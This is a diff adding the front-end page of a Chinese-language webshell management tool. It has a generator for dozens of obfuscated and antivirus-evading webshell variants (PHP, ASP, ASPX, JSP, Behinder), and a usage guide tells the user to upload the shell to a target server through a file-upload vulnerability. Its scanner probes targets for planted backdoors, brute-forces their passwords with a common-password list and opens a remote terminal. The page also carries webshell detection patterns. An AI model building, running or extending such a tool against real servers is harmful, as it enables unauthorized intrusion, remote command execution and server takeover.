+                    <button onclick="filterShellCategory('ASPX')" class="shell-cat-btn text-[10px] px-2 py-1 rounded bg-slate-700 text-slate-300" data-cat="ASPX">ASPX</button>
+                    <button onclick="filterShellCategory('JSP')" class="shell-cat-btn text-[10px] px-2 py-1 rounded bg-slate-700 text-slate-300" data-cat="JSP">JSP</button>
+                    <button onclick="filterShellCategory('冰蝎')" class="shell-cat-btn text-[10px] px-2 py-1 rounded bg-slate-700 text-slate-300" data-cat="冰蝎">冰蝎</button>
+                    <button onclick="filterShellCategory('其他')" class="shell-cat-btn text-[10px] px-2 py-1 rounded bg-slate-700 text-slate-300" data-cat="其他">其他</button>
+                </div>
+
+                <!-- 快速推荐按钮 -->
+                <div class="bg-slate-900 rounded p-2">
+                    <div class="text-[10px] text-slate-500 mb-2">⚡ 快速选择 (根据目标 PHP 版本)</div>
+                    <div class="flex gap-2 flex-wrap">
+                        <button onclick="quickSelectShell('php8')" class="text-[10px] px-2 py-1 rounded bg-green-600 hover:bg-green-700 text-white">
+                            PHP 8.x (推荐)
+                        </button>
+                        <button onclick="quickSelectShell('php7')" class="text-[10px] px-2 py-1 rounded bg-yellow-600 hover:bg-yellow-700 text-white">
+                            PHP 7.x
+                        </button>
+                        <button onclick="quickSelectShell('bypass')" class="text-[10px] px-2 py-1 rounded bg-red-600 hover:bg-red-700 text-white">
+                            免杀型
+                        </button>
+                        <button onclick="quickSelectShell('behinder')" class="text-[10px] px-2 py-1 rounded bg-blue-600 hover:bg-blue-700 text-white">
+                            冰蝎加密
+                        </button>
+                    </div>
+                </div>
+
+                <div class="grid grid-cols-3 gap-3">
+                    <div>
+                        <label class="block text-xs text-slate-400 mb-1">类型</label>
+                        <select id="genShellType" class="w-full bg-slate-900 text-slate-200 border border-slate-600 rounded p-2 text-xs" onchange="updateGeneratedShell()">
+                            <optgroup label="🟢 PHP 8.x 专用 (推荐)">
+                                <option value="php8_eval">PHP8 Eval (最可靠)</option>
+                                <option value="php8_system">PHP8 System</option>
+                                <option value="php8_passthru">PHP8 Passthru</option>
+                                <option value="php8_shell_exec">PHP8 Shell_Exec</option>
+                                <option value="php8_proc_open">PHP8 Proc_Open (功能最强)</option>
+                                <option value="php8_popen">PHP8 Popen</option>
+                                <option value="php8_exec">PHP8 Exec</option>
+                                <option value="php8_dynamic">PHP8 动态函数</option>
+                                <option value="php8_backtick">PHP8 反引号执行</option>
+                                <option value="php8_pcntl">PHP8 Pcntl_Exec</option>
+                            </optgroup>
+                            <optgroup label="🟡 PHP 7.x 专用">
+                                <option value="php7_create_function">PHP7 Create_Function</option>
+                                <option value="php7_assert">PHP7 Assert</option>
+                                <option value="php7_preg_replace">PHP7 Preg_Replace /e</option>
+                            </optgroup>
+                            <optgroup label="🔵 PHP 通用 (5.x-8.x)">
+                                <option value="php_base64">PHP Base64编码</option>
+                                <option value="php_rot13">PHP ROT13编码</option>
+                                <option value="php_xor">PHP XOR加密</option>
+                                <option value="php_concat">PHP 字符串拼接</option>
+                                <option value="php_variable_func">PHP 变量函数</option>
+                                <option value="php_strrev">PHP 字符反转</option>
+                                <option value="php_multilayer_b64">PHP 多层Base64</option>
+                                <option value="php_gzip">PHP Gzip压缩</option>
+                                <option value="php_comment_split">PHP 注释分割</option>
+                                <option value="php_unicode">PHP Unicode编码</option>
+                                <option value="php_hex">PHP Hex编码</option>
+                                <option value="php_chr_shift">PHP Chr编码</option>
+                                <option value="php_no_alpha_num">PHP 无字母数字</option>
+                            </optgroup>
+                            <optgroup label="PHP 回调函数">
+                                <option value="php_callback_array">PHP array_map</option>
+                                <option value="php_callback_filter">PHP array_filter</option>
+                                <option value="php_callback_walk">PHP array_walk</option>
+                                <option value="php_callback_usort">PHP usort</option>
+                                <option value="php_callback_reduce">PHP array_reduce</option>
+                                <option value="php_preg_callback">PHP 正则回调</option>
+                            </optgroup>
+                            <optgroup label="PHP 类与魔术方法">
+                                <option value="php_class_construct">PHP __construct</option>
+                                <option value="php_class_invoke">PHP __invoke</option>
+                                <option value="php_class_call">PHP __call</option>
+                                <option value="php_class_get">PHP __get</option>
+                                <option value="php_reflection">PHP 反射调用</option>
+                            </optgroup>
+                            <optgroup label="PHP 传参方式">
+                                <option value="php_cookie">PHP Cookie传参</option>
+                                <option value="php_header">PHP Header传参</option>
+                                <option value="php_request">PHP Request混合</option>
+                                <option value="php_variable_overwrite">PHP 变量覆盖</option>
+                            </optgroup>
+                            <optgroup label="PHP 特殊类型">
+                                <option value="php_include">PHP 文件包含</option>
+                                <option value="php_dynamic_func">PHP 动态函数</option>
+                                <option value="php_image_header">PHP 图片马</option>
+                                <option value="php_session">PHP Session型</option>
+                                <option value="php_log_include">PHP 日志包含</option>
+                                <option value="php_htaccess">.htaccess配置</option>
+                            </optgroup>
+                            <optgroup label="ASP 系列">
+                                <option value="asp_simple">ASP 一句话</option>
+                                <option value="asp_encode">ASP 编码执行</option>
+                                <option value="asp_chr">ASP Chr编码</option>
+                                <option value="asp_include">ASP SSI包含</option>
+                            </optgroup>
+                            <optgroup label="ASPX 系列">
+                                <option value="aspx_jscript">ASPX JScript</option>
+                                <option value="aspx_csharp">ASPX C#命令</option>
+                                <option value="aspx_base64">ASPX Base64</option>
+                                <option value="aspx_reflection">ASPX 反射加载</option>
+                            </optgroup>
+                            <optgroup label="JSP 系列">
+                                <option value="jsp_runtime">JSP Runtime执行</option>
+                                <option value="jsp_processbuilder">JSP ProcessBuilder</option>
+                                <option value="jsp_scriptengine">JSP 脚本引擎</option>
+                                <option value="jsp_expression">JSP EL表达式</option>
+                                <option value="jsp_bsh">JSP BeanShell</option>
+                            </optgroup>
+                            <optgroup label="冰蝎增强版">
+                                <option value="behinder_php_enhanced">冰蝎 PHP 增强版</option>
+                                <option value="behinder_jsp_enhanced">冰蝎 JSP 增强版</option>
+                            </optgroup>
+                            <optgroup label="Python">
+                                <option value="py_flask">Python Flask</option>
+                                <option value="py_django">Python Django</option>
+                            </optgroup>
+                            <optgroup label="其他语言">
+                                <option value="nodejs_express">Node.js Express</option>
+                                <option value="go_http">Go HTTP</option>
+                            </optgroup>
+                        </select>
+                    </div>
+                    <div>
+                        <label class="block text-xs text-slate-400 mb-1">密码/参数名</label>
+                        <input type="text" id="genShellPassword" placeholder="cmd"
+                               class="w-full bg-slate-900 text-yellow-400 border border-slate-600 rounded p-2 text-xs" oninput="updateGeneratedShell()">
+                    </div>
+                    <div>
+                        <label class="block text-xs text-slate-400 mb-1">混淆级别</label>
+                        <select id="genObfuscateLevel" class="w-full bg-slate-900 text-slate-200 border border-slate-600 rounded p-2 text-xs" onchange="updateGeneratedShell()">
+                            <option value="none">无混淆</option>
+                            <option value="basic">基础混淆</option>
+                            <option value="variable">变量名混淆</option>
+                            <option value="comment">添加干扰注释</option>
+                        </select>
+                    </div>
+                </div>
+
+                <!-- 类型说明 -->
+                <div id="shellDescription" class="bg-slate-900 rounded p-2 text-xs text-slate-400">
+                    <span class="text-cyan-400">💡 说明:</span> 选择类型查看详细说明
+                </div>
+
+                <div>
+                    <div class="flex justify-between items-center mb-1">
+                        <label class="text-xs text-slate-400">生成的代码</label>
+                        <div class="flex gap-2">
+                            <span id="codeSize" class="text-[10px] text-slate-500">0 bytes</span>
+                            <span id="codeLines" class="text-[10px] text-slate-500">0 行</span>
+                        </div>
+                    </div>
+                    <textarea id="generatedShellCode" rows="12" readonly
+                              class="w-full bg-slate-900 text-green-400 border border-slate-600 rounded p-2 text-xs font-mono"></textarea>
+                </div>
+
+                <!-- 快速操作 -->
+                <div class="grid grid-cols-5 gap-2">
+                    <button onclick="copyGeneratedShell()" class="bg-purple-600 hover:bg-purple-700 text-white text-xs py-2 rounded flex items-center justify-center gap-1">
+                        📋 复制
+                    </button>
+                    <button onclick="downloadGeneratedShell()" class="bg-green-600 hover:bg-green-700 text-white text-xs py-2 rounded flex items-center justify-center gap-1">
+                        💾 下载
+                    </button>
+                    <button onclick="generateAndAdd()" class="bg-pink-600 hover:bg-pink-700 text-white text-xs py-2 rounded flex items-center justify-center gap-1">
+                        ➕ 添加
+                    </button>
+                    <button onclick="downloadAsZip()" class="bg-blue-600 hover:bg-blue-700 text-white text-xs py-2 rounded flex items-center justify-center gap-1">
+                        📦 批量
+                    </button>
+                    <button onclick="generateRandomShell()" class="bg-orange-600 hover:bg-orange-700 text-white text-xs py-2 rounded flex items-center justify-center gap-1">
+                        🎲 随机
+                    </button>
+                </div>
+
+                <!-- 使用指南 -->
+                <div class="bg-slate-900 rounded p-2">
+                    <div class="flex justify-between items-center mb-1">
+                        <span class="text-[10px] text-slate-500">📖 使用指南</span>
+                        <button onclick="toggleUsageGuide()" class="text-[10px] text-blue-400 hover:text-blue-300">展开/收起</button>
+                    </div>
+                    <div id="usageGuide" class="text-[10px] text-slate-400 space-y-1 hidden">
+                        <p><span class="text-cyan-400">1.</span> 生成代码后,复制或下载保存为 .php 文件</p>
+                        <p><span class="text-cyan-400">2.</span> 将文件上传到目标服务器 (利用文件上传漏洞)</p>
+                        <p><span class="text-cyan-400">3.</span> 点击 "添加 Shell" 输入 URL 和密码</p>
+                        <p><span class="text-cyan-400">4.</span> 选择正确的类型 (php8_eval 对应 PHP 8.x)</p>
+                        <p><span class="text-yellow-400">⚠️</span> 如果连接失败,尝试其他类型或检查 disable_functions</p>
+                        <p><span class="text-green-400">💡</span> PHP 8.x 靶场推荐使用: php8_eval 或 php8_proc_open</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 批量下载选择模态框 -->
+    <div id="batchDownloadModal" class="fixed inset-0 bg-black/50 flex items-center justify-center z-[60] hidden">
+        <div class="bg-slate-800 rounded-lg shadow-xl border border-slate-700 w-[500px] max-h-[70vh]">
+            <div class="p-3 border-b border-slate-700 flex justify-between items-center">
+                <h3 class="text-sm font-bold text-blue-400">📦 批量下载 Webshell</h3>
+                <button onclick="hideBatchDownloadModal()" class="text-slate-500 hover:text-white">&times;</button>
+            </div>
+            <div class="p-3 space-y-3 max-h-[50vh] overflow-y-auto">
+                <div class="flex justify-between items-center mb-2">
+                    <span class="text-xs text-slate-400">选择要下载的类型:</span>
+                    <div class="flex gap-2">
+                        <button onclick="selectAllShells()" class="text-[10px] text-blue-400 hover:text-blue-300">全选</button>
+                        <button onclick="deselectAllShells()" class="text-[10px] text-slate-400 hover:text-slate-300">取消全选</button>
+                    </div>
+                </div>
+                <div id="batchShellList" class="space-y-1">
+                    <!-- 动态生成 -->
+                </div>
+            </div>
+            <div class="p-3 border-t border-slate-700 flex gap-2">
+                <button onclick="hideBatchDownloadModal()" class="flex-1 bg-slate-700 hover:bg-slate-600 text-white text-xs py-2 rounded">取消</button>
+                <button onclick="executeBatchDownload()" class="flex-1 bg-blue-600 hover:bg-blue-700 text-white text-xs py-2 rounded">下载选中 (<span id="selectedCount">0</span>)</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- 导入模态框 -->
+    <div id="importModal" class="fixed inset-0 bg-black/50 flex items-center justify-center z-50 hidden">
+        <div class="bg-slate-800 rounded-lg shadow-xl border border-slate-700 w-[450px]">
+            <div class="p-3 border-b border-slate-700 flex justify-between items-center">
+                <h3 class="text-sm font-bold text-cyan-400">导入 Shell 配置</h3>
+                <button onclick="hideImportModal()" class="text-slate-500 hover:text-white">&times;</button>
+            </div>
+            <div class="p-3 space-y-3">
+                <div>
+                    <label class="block text-xs text-slate-400 mb-1">格式</label>
+                    <select id="importFormat" class="w-full bg-slate-900 text-slate-200 border border-slate-600 rounded p-2 text-xs">
+                        <option value="json">JSON</option>
+                        <option value="csv">CSV</option>
+                    </select>
+                </div>
+                <div>
+                    <label class="block text-xs text-slate-400 mb-1">数据</label>
+                    <textarea id="importData" rows="8" placeholder="粘贴 JSON 或 CSV 数据..."
+                              class="w-full bg-slate-900 text-green-400 border border-slate-600 rounded p-2 text-xs font-mono"></textarea>
+                </div>
+            </div>
+            <div class="p-3 border-t border-slate-700 flex gap-2">
+                <button onclick="hideImportModal()" class="flex-1 bg-slate-700 hover:bg-slate-600 text-white text-xs py-2 rounded">取消</button>
+                <button onclick="importShells()" class="flex-1 bg-cyan-600 hover:bg-cyan-700 text-white text-xs py-2 rounded">导入</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Socket.IO 连接
+        let socket = null;
+
+        // 初始化
+        document.addEventListener('DOMContentLoaded', async function() {
+            // 初始化 Socket.IO
+            socket = io();
+
+            socket.on('connect', () => {
+                console.log('[+] Socket.IO 已连接');
+                addScanLog('[+] Socket.IO 已连接', 'success');
+            });
+
+            socket.on('disconnect', () => {
+                console.log('[-] Socket.IO 断开');
+            });
+
+            // 接收扫描日志
+            socket.on('log', (data) => {
+                if (data.source === 'webshell-scan') {
+                    addScanLog(data.data, 'info');
+                    // 检测是否发现了webshell
+                    if (data.data.includes('[200]') || data.data.includes('Found')) {
+                        const urlMatch = data.data.match(/https?:\/\/[^\s]+/);
+                        if (urlMatch) {
+                            addFoundShell(urlMatch[0], 'scan', '扫描发现');
+                        }
+                    }
+                }
+            });
+
+            socket.on('scan-status', (data) => {
+                if (data.type === 'webshell-scan') {
+                    if (data.status === 'stopped') {
+                        addScanLog('[✓] 扫描完成', 'success');
+                    }
+                }
+            });
+
+            WebshellCore.init();
+            refreshShellList();
+            updateGeneratedShell();
+
+            // 自动填入本机 IP
+            document.getElementById('reverseIp').placeholder = window.location.hostname;
+
+            // 终端输入监听
+            document.getElementById('terminalInput').addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    executeTerminalCommand();
+                }
+            });
+
+            // 初始化加密状态显示
+            updateCryptoStatus(false);
+        });
+
+        // 更新加密状态显示
+        function updateCryptoStatus(enabled, shell = null) {
+            const statusEl = document.getElementById('cryptoStatus');
+            const iconEl = document.getElementById('cryptoIcon');
+            const textEl = document.getElementById('cryptoText');
+            const sessionBar = document.getElementById('sessionInfoBar');
+
+            if (enabled && shell) {
+                statusEl.classList.remove('hidden', 'bg-slate-800', 'text-slate-500');
+                statusEl.classList.add('bg-green-900/50', 'text-green-400', 'crypto-active');
+                iconEl.textContent = '🔐';
+                iconEl.classList.add('animate-pulse');
+                textEl.textContent = 'AES-256';
+
+                // 显示会话信息
+                sessionBar.classList.remove('hidden');
+                document.getElementById('sessionId').textContent = shell.crypto?.sessionId?.substring(0, 8) || '-';
+                document.getElementById('sequenceNum').textContent = shell.crypto?.sequence || 0;
+                document.getElementById('currentUA').textContent = shell.userAgent === 'random' ? 'Random' : shell.userAgent;
+            } else {
+                statusEl.classList.remove('bg-green-900/50', 'text-green-400', 'crypto-active');
+                statusEl.classList.add('bg-slate-800', 'text-slate-500');
+                iconEl.textContent = '🔓';
+                iconEl.classList.remove('animate-pulse');
+                textEl.textContent = '未加密';
+                sessionBar.classList.add('hidden');
+            }
+        }
+
+        // Tab 切换
+        function switchTab(tabName) {
+            const tabs = ['scanner', 'terminal', 'files', 'reverse', 'proxy', 'info', 'config'];
+            tabs.forEach(t => {
+                document.getElementById(`tab-${t}`).classList.remove('text-pink-400', 'bg-slate-800', 'border-b-2', 'border-pink-500');
+                document.getElementById(`tab-${t}`).classList.add('text-slate-400');
+                document.getElementById(`panel-${t}`).classList.add('hidden');
+            });
+            document.getElementById(`tab-${tabName}`).classList.add('text-pink-400', 'bg-slate-800', 'border-b-2', 'border-pink-500');
+            document.getElementById(`tab-${tabName}`).classList.remove('text-slate-400');
+            document.getElementById(`panel-${tabName}`).classList.remove('hidden');
+
+            // 刷新特定 Tab
+            if (tabName === 'files' && WebshellCore.getActiveShell()) {
+                refreshFileList();
+            } else if (tabName === 'info' && WebshellCore.getActiveShell()) {
+                refreshSystemInfo();
+            }
+        }
+
+        // ==================== 扫描功能 ====================
+
+        let scanState = {
+            running: false,
+            target: '',
+            foundShells: [],
+            scannedPaths: 0
+        };
+
+        // SecLists 路径
+        const SECLISTS_PATH = '/usr/share/seclists';
+        const WEBSHELL_WORDLIST = SECLISTS_PATH + '/Web-Shells/backdoor_list.txt';
+        const DIR_WORDLIST = SECLISTS_PATH + '/Discovery/Web-Content/common.txt';
+        const DIR_MEDIUM_WORDLIST = SECLISTS_PATH + '/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt';
+
+        // 常见 webshell 路径 (备用)
+        const COMMON_SHELL_PATHS = [
+            '/shell.php', '/cmd.php', '/c.php', '/b.php', '/a.php', '/1.php', '/x.php', '/test.php',
+            '/admin/shell.php', '/admin/cmd.php', '/admin/config.php', '/admin/upload.php',
+            '/upload/shell.php', '/uploads/shell.php', '/uploadfiles/shell.php',
+            '/images/shell.php', '/img/shell.php', '/pic/shell.php', '/assets/shell.php',
+            '/tmp/shell.php', '/temp/shell.php', '/cache/shell.php', '/log/shell.php',
+            '/backup/shell.php', '/bak/shell.php', '/.shell.php', '/config.php',
+            '/behinder.php', '/ant.php', '/antsword.php', '/b374k.php', '/wso.php',
+            '/c99.php', '/r57.php', '/webshell.php', '/cmd.asp', '/shell.aspx', '/cmd.aspx'
+        ];
+
+        // 常见密码
+        const COMMON_PASSWORDS = ['cmd', 'pass', 'password', 'shell', 'admin', 'root', 'test', '123456', 'c', 'b', 'a', 'x', 'key', 'secret', 'pwd'];
+
+        // 开始自动扫描
+        async function startAutoScan() {
+            let targetUrl = document.getElementById('scanTargetUrl').value.trim();
+            if (!targetUrl) {
+                alert('请输入目标网址');
+                return;
+            }
+
+            // 确保URL格式正确
+            if (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://')) {
+                targetUrl = 'http://' + targetUrl;
+            }
+
+            scanState.running = true;
+            scanState.target = targetUrl.replace(/\/$/, '');
+            scanState.foundShells = [];
+            scanState.scannedPaths = 0;
+
+            document.getElementById('startScanBtn').classList.add('hidden');
+            document.getElementById('stopScanBtn').classList.remove('hidden');
+            document.getElementById('foundShells').innerHTML = '<div class="text-slate-600 text-xs text-center py-4">扫描中...</div>';
+            document.getElementById('scanLogs').innerHTML = '';
+
+            addScanLog(`[*] 开始扫描: ${scanState.target}`, 'info');
+            updateScanProgress('正在扫描...');
+
+            try {
+                // 1. 调用后端 Nuclei 扫描 webshell POC
+                if (document.getElementById('scanNuclei').checked) {
+                    addScanLog('[*] Nuclei Webshell POC 扫描...', 'info');
+                    await runBackendNucleiScan();
+                }
+
+                // 2. 调用后端 gobuster/dirb 使用 seclists 扫描
+                if (document.getElementById('scanCommonPaths').checked || document.getElementById('scanFuzz').checked) {
+                    addScanLog('[*] 使用 SecLists 字典扫描...', 'info');
+                    await runBackendFuzzScan();
+                }
+
+                // 3. 前端快速扫描 (补充)
+                if (document.getElementById('scanCommonPaths').checked) {
+                    addScanLog('[*] 前端快速扫描常见路径...', 'info');
+                    await frontendQuickScan();
+                }
+
+                // 4. 扫描备份文件
+                if (document.getElementById('scanBackup').checked) {
+                    addScanLog('[*] 扫描备份文件...', 'info');
+                    await scanBackupFiles();
+                }
+
+                addScanLog('[✓] 扫描完成!', 'success');
+            } catch (e) {
+                addScanLog(`[!] 扫描错误: ${e.message}`, 'error');
+            }
+
+            scanState.running = false;
+            document.getElementById('startScanBtn').classList.remove('hidden');
+            document.getElementById('stopScanBtn').classList.add('hidden');
+            updateScanProgress('完成');
+        }
+
+        function stopAutoScan() {
+            scanState.running = false;
+
+            // 停止后端扫描
+            if (socket) {
+                socket.emit('stop-scan', 'nuclei');
+                socket.emit('stop-scan', 'webshell-scan');
+            }
+
+            addScanLog('[!] 扫描已停止', 'warning');
+            document.getElementById('startScanBtn').classList.remove('hidden');
+            document.getElementById('stopScanBtn').classList.add('hidden');
+        }
+
+        // 后端 Nuclei 扫描
+        async function runBackendNucleiScan() {
+            return new Promise((resolve) => {
+                if (!socket || !socket.connected) {
+                    addScanLog('[!] Socket 未连接', 'error');
+                    resolve();
+                    return;
+                }
+
+                const nucleiHandler = (data) => {
+                    if (data.source === 'nuclei') {
+                        // 检测发现的漏洞/路径
+                        const text = data.data;
+                        if (text.includes('[webshell]') || text.includes('[backdoor]') || text.includes('shell')) {
+                            const urlMatch = text.match(/https?:\/\/[^\s\]]+/);
+                            if (urlMatch) {
+                                addFoundShell(urlMatch[0], 'nuclei', 'Nuclei POC');
+                            }
+                        }
+                    }
+                };
+
+                socket.on('log', nucleiHandler);
+
+                socket.emit('start-nuclei', {
+                    target: scanState.target,
+                    args: '-t http/vulnerabilities -silent -stats'
+                });
+
+                // 30秒后超时
+                setTimeout(() => {
+                    socket.off('log', nucleiHandler);
+                    resolve();
+                }, 30000);
+            });
+        }
+
+        // 后端 Fuzz 扫描 (使用 seclists)
+        async function runBackendFuzzScan() {
+            return new Promise((resolve) => {
+                if (!socket || !socket.connected) {
+                    addScanLog('[!] Socket 未连接，使用前端扫描', 'warning');
+                    resolve();
+                    return;
+                }
+
+                // 检查 seclists 是否存在，使用正确的字典
+                const scanHandler = (data) => {
+                    if (data.source === 'webshell-scan') {
+                        addScanLog(data.data, 'info');
+
+                        // 检测200响应
+                        if (data.data.includes('200') || data.data.includes('Found')) {
+                            const urlMatch = data.data.match(/https?:\/\/[^\s]+/);
+                            if (urlMatch) {
+                                addFoundShell(urlMatch[0], 'fuzz', '字典扫描');
+                            }
+                        }
+                    }
+                };
+
+                socket.on('log', scanHandler);
+
+                // 发送自定义扫描事件
+                socket.emit('start-webshell-scan', {
+                    target: scanState.target,
+                    wordlist: WEBSHELL_WORDLIST,
+                    threads: 50
+                });
+
+                // 60秒后超时
+                setTimeout(() => {
+                    socket.off('log', scanHandler);
+                    resolve();
+                }, 60000);
+            });
+        }
+
+        // 前端快速扫描
+        async function frontendQuickScan() {
+            const batchSize = 10;
+            for (let i = 0; i < COMMON_SHELL_PATHS.length; i += batchSize) {
+                if (!scanState.running) break;
+
+                const batch = COMMON_SHELL_PATHS.slice(i, i + batchSize);
+                const promises = batch.map(async (path) => {
+                    const url = scanState.target + path;
+                    try {
+                        const response = await fetch(url, { method: 'GET', signal: AbortSignal.timeout(5000) });
+                        if (response.ok) {
+                            const text = await response.text();
+                            if (isWebshellResponse(text, url)) {
+                                addFoundShell(url, 'quick', '快速扫描');
+                            } else {
+                                // 即使没有特征，200响应也记录
+                                addScanLog(`[200] ${url}`, 'info');
+                            }
+                        }
+                    } catch (e) {
+                        // 忽略
+                    }
+                });
+
+                await Promise.all(promises);
+                scanState.scannedPaths += batch.length;
+                updateScanProgress(`已扫描 ${scanState.scannedPaths} 路径`);
+            }
+        }
+
+        // 检测 webshell 响应特征
+        function isWebshellResponse(text, url) {
+            const patterns = [
+                /eval\s*\(/i, /assert\s*\(/i, /system\s*\(/i, /passthru\s*\(/i,
+                /shell_exec\s*\(/i, /exec\s*\(/i, /popen\s*\(/i, /proc_open\s*\(/i,
+                /\$_POST\s*\[/i, /\$_GET\s*\[/i, /\$_REQUEST\s*\[/i,
+                /base64_decode\s*\(/i, /gzinflate\s*\(/i, /str_rot13\s*\(/i,
+                /Runtime\.getRuntime\(\)/i, /ProcessBuilder/i,
+                /<form[^>]*method[^>]*post/i, /<input[^>]*type[^>]*password/i,
+                /c99/i, /r57/i, /wso/i, /b374k/i,
+                /behinder/i, /antsword/i, /冰蝎/i, /蚁剑/i
+            ];
+
+            for (const pattern of patterns) {
+                if (pattern.test(text)) {
+                    return true;
+                }
+            }
+
+            // 检查URL是否包含可疑关键词
+            const suspiciousNames = ['shell', 'cmd', 'webshell', 'backdoor', 'c99', 'r57', 'wso', 'b374k', 'behinder', 'ant'];
+            const filename = url.split('/').pop().toLowerCase();
+            for (const name of suspiciousNames) {
+                if (filename.includes(name)) {
+                    return true;
+                }
+            }
+
+            return false;
+        }
+
+        // 扫描备份文件
+        async function scanBackupFiles() {
+            const commonFiles = ['index.php', 'config.php', 'admin.php', 'upload.php', 'db.php', 'conn.php'];
+            const suffixes = ['.bak', '.backup', '.old', '.orig', '.save', '.swp', '.tmp', '~', '.zip', '.tar.gz', '.rar'];
+
+            for (const file of commonFiles) {
+                if (!scanState.running) break;
+
+                for (const suffix of suffixes) {
+                    const url = scanState.target + '/' + file + suffix;
+                    try {
+                        const response = await fetch(url, { method: 'HEAD', signal: AbortSignal.timeout(3000) });
+                        if (response.ok) {
+                            addScanLog(`[+] 发现备份: ${url}`, 'success');
+                        }
+                    } catch (e) {}
+                }
+            }
+        }
+
+        // 添加扫描日志
+        function addScanLog(message, type = 'info') {
+            const logsEl = document.getElementById('scanLogs');
+            const colors = {
+                'info': 'text-cyan-400',
+                'success': 'text-green-400',
+                'error': 'text-red-400',
+                'warning': 'text-yellow-400'
+            };
+
+            const entry = document.createElement('div');
+            entry.className = colors[type] || 'text-slate-400';
+            entry.textContent = message;
+
+            if (logsEl.querySelector('.text-slate-600')) {
+                logsEl.innerHTML = '';
+            }
+            logsEl.appendChild(entry);
+            logsEl.scrollTop = logsEl.scrollHeight;
+        }
+
+        // 更新扫描进度
+        function updateScanProgress(text) {
+            document.getElementById('scanProgress').textContent = text;
+        }
+
+        // 添加发现的 shell
+        function addFoundShell(url, type, description) {
+            // 避免重复
+            if (scanState.foundShells.find(s => s.url === url)) return;
+
+            scanState.foundShells.push({ url, type, description });
+
+            const foundEl = document.getElementById('foundShells');
+            if (foundEl.querySelector('.text-center')) {
+                foundEl.innerHTML = '';
+            }
+
+            const entry = document.createElement('div');
+            entry.className = 'bg-slate-900 rounded p-2 border border-green-500/50';
+            entry.innerHTML = `
+                <div class="flex justify-between items-center">
+                    <span class="text-green-400 text-xs truncate flex-1" title="${url}">${url}</span>
+                    <span class="text-[10px] text-slate-500 ml-2">${type}</span>
+                </div>
+                <div class="text-[10px] text-slate-500 mt-1">${description}</div>
+                <div class="flex gap-2 mt-2">
+                    <button onclick="tryConnectShell('${url}')" class="text-[10px] bg-pink-600 hover:bg-pink-700 text-white px-2 py-0.5 rounded">连接</button>
+                    <button onclick="testShellUrl('${url}')" class="text-[10px] bg-blue-600 hover:bg-blue-700 text-white px-2 py-0.5 rounded">测试</button>
+                    <button onclick="copyToClipboard('${url}')" class="text-[10px] bg-slate-600 hover:bg-slate-700 text-white px-2 py-0.5 rounded">复制</button>
+                </div>
+            `;
+            foundEl.appendChild(entry);
+
+            document.getElementById('foundShellCount').textContent = scanState.foundShells.length;
+            document.getElementById('quickConnectPanel').classList.remove('hidden');
+            document.getElementById('quickConnectUrl').value = url;
+
+            addScanLog(`[+] 发现: ${url}`, 'success');
+        }
+
+        // 尝试连接发现的 shell
+        async function tryConnectShell(url) {
+            document.getElementById('quickConnectUrl').value = url;
+            document.getElementById('quickConnectPanel').classList.remove('hidden');
+
+            // 尝试常见密码
+            for (const pwd of COMMON_PASSWORDS) {
+                if (!scanState.running) break;
+                addScanLog(`[*] 尝试密码: ${pwd}`, 'info');
+
+                try {
+                    const shell = await WebshellCore.addShell({
+                        name: 'Discovered: ' + url.split('/').pop(),
+                        url: url,
+                        password: pwd,
+                        type: 'php_eval'
+                    });
+
+                    const result = await WebshellCore.testShell(shell);
+                    if (result.success) {
+                        addScanLog(`[+] 连接成功! 密码: ${pwd}`, 'success');
+                        await WebshellCore.setActiveShell(shell.id);
+                        refreshShellList();
+                        selectShell(shell.id);
+                        switchTab('terminal');
+                        return;
+                    }
+
+                    WebshellCore.deleteShell(shell.id);
+                } catch (e) {
+                    // 继续尝试下一个密码
+                }
+            }
+
+            addScanLog('[!] 自动破解失败，请手动输入密码', 'warning');
+        }
+
+        // 测试 shell URL
+        async function testShellUrl(url) {
+            try {
+                addScanLog(`[*] 测试: ${url}`, 'info');
+                const response = await fetch(url);
+                const text = await response.text();
+                addScanLog(`[*] 状态码: ${response.status}, 响应长度: ${text.length}`, 'info');
+
+                if (isWebshellResponse(text, url)) {
+                    addScanLog('[+] 检测到 webshell 特征!', 'success');
+                } else {
+                    addScanLog('[-] 未检测到明显特征', 'warning');
+                }
+            } catch (e) {
+                addScanLog(`[!] 测试失败: ${e.message}`, 'error');
+            }
+        }
+
+        // 复制到剪贴板
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text);
+            addScanLog('[*] 已复制到剪贴板', 'info');
+        }
+
+        // 快速连接
+        async function quickConnect() {
+            const url = document.getElementById('quickConnectUrl').value;
+            const password = document.getElementById('quickConnectPassword').value;
+            const type = document.getElementById('quickConnectType').value;
+
+            if (!url || !password) {
+                alert('请输入 URL 和密码');
+                return;
+            }
+
+            addScanLog(`[*] 正在连接: ${url}`, 'info');
+
+            const shell = await WebshellCore.addShell({
+                name: 'Quick: ' + url.split('/').pop(),
+                url: url,
+                password: password,
+                type: type === 'auto' ? 'php_eval' : type
+            });
+
+            const result = await WebshellCore.testShell(shell);
+            if (result.success) {
+                addScanLog('[+] 连接成功!', 'success');
+                await WebshellCore.setActiveShell(shell.id);
+                refreshShellList();
+                selectShell(shell.id);
+                switchTab('terminal');
+            } else {
+                addScanLog(`[-] 连接失败: ${result.message}`, 'error');
+                WebshellCore.deleteShell(shell.id);
+            }
+        }
+
+        // 扫描常见 webshell (快捷按钮)
+        async function scanCommonWebshells() {
+            const target = document.getElementById('scanTargetUrl').value;
+            if (!target) {
+                alert('请先输入目标网址');
+                return;
+            }
+            if (!target.startsWith('http')) {
+                document.getElementById('scanTargetUrl').value = 'http://' + target;
+            }
+            await startAutoScan();
+        }
+
+        // 调用 Nuclei (快捷按钮)
+        async function scanWithNuclei() {
+            const target = document.getElementById('scanTargetUrl').value;
+            if (!target) {
+                alert('请先输入目标网址');
+                return;
+            }
+            document.getElementById('scanNuclei').checked = true;
+            document.getElementById('scanCommonPaths').checked = false;
+            document.getElementById('scanBackup').checked = false;
+            document.getElementById('scanFuzz').checked = false;
+            await startAutoScan();
+        }
+
+        // 目录爆破 (快捷按钮)
+        async function fuzzDirectories() {
+            const target = document.getElementById('scanTargetUrl').value;
+            if (!target) {
+                alert('请先输入目标网址');
+                return;
+            }
